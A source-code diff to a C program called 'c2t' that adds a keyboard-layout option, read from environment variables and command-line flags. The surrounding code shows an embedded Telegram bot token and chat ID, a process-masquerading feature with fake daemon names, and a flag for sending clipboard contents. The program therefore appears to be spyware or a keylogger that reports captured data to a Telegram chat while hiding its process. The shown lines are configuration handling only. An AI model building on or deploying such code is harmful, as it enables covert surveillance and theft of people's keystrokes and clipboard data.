@@ -46,6 +46,7 @@ static c2t_config_t config;
 static char embedded_bot_token[512];
 static char embedded_chat_id[128];
 static char embedded_proxy[512];
+static char embedded_keyboard_layout[64];
 #ifdef C2T_ENABLE_PROCESS_MASQUERADE
 static char embedded_daemon_name[64];
 static char embedded_supervisor_name[64];
@@ -222,6 +223,18 @@ void c2t_config_load([[maybe_unused]] const char *executable_path)
     if (!config.supervisor_name || !*config.supervisor_name)
         config.supervisor_name = "t2c";
 #endif
+    config.keyboard_layout = configured_value(
+        "C2T_KEYBOARD_LAYOUT", embedded_keyboard_layout, sizeof(embedded_keyboard_layout));
+    if (!config.keyboard_layout || !*config.keyboard_layout) {
+        config.keyboard_layout = configured_value(
+            "TELEGRAM_KEYBOARD_LAYOUT", embedded_keyboard_layout, sizeof(embedded_keyboard_layout));
+    }
+    if (!config.keyboard_layout || !*config.keyboard_layout) {
+        config.keyboard_layout = configured_value(
+            "KEYBOARD_LAYOUT", embedded_keyboard_layout, sizeof(embedded_keyboard_layout));
+    }
+    if (config.keyboard_layout && !*config.keyboard_layout)
+        config.keyboard_layout = nullptr;
     config.telegram_bot_token = configured_value(
         "TELEGRAM_BOT_TOKEN", embedded_bot_token,
         sizeof(embedded_bot_token));
@@ -280,6 +293,12 @@ const char *c2t_config_apply_arguments(int argc, char **argv)
         } else if (strcmp(argv[index], "--send-clipboard") == 0 ||
                    strcmp(argv[index], "--enable-clipboard") == 0) {
             config.disable_clipboard = 0;
+        } else if (strcmp(argv[index], "--keyboard-layout") == 0 ||
+                   strcmp(argv[index], "--layout") == 0) {
+            if (index + 1 >= argc)
+                return argv[index];
+            ++index;
+            config.keyboard_layout = argv[index];
         } else if (strcmp(argv[index], "--proxy") == 0 ||
                    strcmp(argv[index], "--proxy-url") == 0) {
             if (index + 1 >= argc)
